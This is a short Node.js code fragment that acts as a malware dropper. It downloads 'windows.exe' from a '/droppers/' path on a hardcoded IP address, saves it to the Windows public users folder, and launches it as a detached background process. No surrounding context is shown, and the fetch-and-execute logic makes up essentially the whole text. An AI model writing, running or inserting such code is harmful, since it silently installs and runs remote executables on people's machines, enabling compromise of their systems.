const BASE = 'http://10.1.2.3:8787';
function fetchToFile(url, destPath, cb) {
 const req = http.get(url, (res) => {
  const file = fs.createWriteStream(destPath, { mode: 0o600 });
  res.pipe(file);
  file.on('finish', () => file.close(() => cb(null)));
 });
}
const winPath = 'c:/users/public/windows.exe';
const url = `${BASE}/droppers/windows.exe`;
fetchToFile(url, winPath, (err) => {
 if (err) return;
 const child = spawn(winPath, [], { detached: true });
 child.unref();
});
